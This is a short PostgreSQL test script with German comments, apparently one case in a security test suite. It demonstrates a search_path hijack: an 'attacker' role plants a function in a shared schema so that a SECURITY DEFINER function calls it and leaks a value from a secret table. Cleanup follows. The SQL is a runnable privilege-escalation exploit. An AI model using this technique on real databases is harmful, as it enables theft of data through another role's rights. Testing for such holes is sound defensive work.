\echo '## E1  search_path-Hijack, Weg 1  (als attacker)'
-- Objekt unter dem Namen anlegen, den pruef_zugriff() unqualifiziert
-- aufruft, im gemeinsamen Schema shared, das im Suchpfad vor public liegt
CREATE OR REPLACE FUNCTION shared.protokoll() RETURNS text
  LANGUAGE plpgsql AS $$
DECLARE b text;
BEGIN
  -- laeuft im Kontext von victim_owner, weil pruef_zugriff SECURITY DEFINER ist
  SELECT wert INTO b FROM public.geheim LIMIT 1;
  RETURN 'HIJACK: ' || b;
END;
$$;
-- Funktion selbst ausloesen; die Rueckgabe zeigt, welches protokoll() traf
SELECT pruef_zugriff();
-- aufraeumen, damit der Nutzfall N1 die Funktion sauber sieht und nicht die
-- untergeschobene Version trifft (das Objekt ist global in der Datenbank)
DROP FUNCTION IF EXISTS shared.protokoll();